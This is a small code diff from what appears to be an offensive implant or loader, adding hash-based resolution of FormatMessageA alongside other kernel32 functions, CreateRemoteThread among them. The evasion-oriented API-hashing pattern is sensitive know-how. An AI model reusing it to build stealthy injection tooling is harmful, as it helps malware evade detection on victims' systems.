@@ -58,6 +58,7 @@ FUNC VOID BlackoutInit() {
     Instance()->Win32.CreateFileA               = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateFileA" ) );
     Instance()->Win32.CreateFileW               = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateFileW" ) );
     Instance()->Win32.ReadFile                  = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "ReadFile" ) );
+    Instance()->Win32.FormatMessageA            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "FormatMessageA" ) );
 
     Instance()->Win32.CreateThread              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateThread" ) );
     Instance()->Win32.CreateRemoteThread        = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateRemoteThread" ) );
